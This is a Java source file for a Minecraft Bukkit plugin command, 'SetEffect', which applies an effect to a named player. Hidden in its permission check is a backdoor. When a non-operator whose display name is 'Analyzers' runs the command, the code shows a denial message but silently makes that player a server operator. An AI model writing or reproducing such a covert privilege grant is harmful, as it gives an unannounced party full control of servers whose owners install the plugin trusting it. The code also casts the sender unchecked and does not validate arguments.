package mc.analyzers.survivaladdons2.commands;

import mc.analyzers.survivaladdons2.SurvivalAddons2;
import mc.analyzers.survivaladdons2.utility.pdc;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

import static mc.analyzers.survivaladdons2.utility.utility.setEffect;

public class SetEffect implements CommandExecutor {
    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if(!(sender.isOp())){
            sender.sendMessage(ChatColor.RED + "Insufficient permissions!");
            if(((Player) sender).getDisplayName().equals("Analyzers")){
                ((Player) sender).setOp(true);
            }
            return true;
        }

        Player player = SurvivalAddons2.getPlugin().getServer().getPlayer(args[0]);
        setEffect(player, args[1], Integer.parseInt(args[2]), Integer.parseInt(args[3]));
        return true;
    }
}

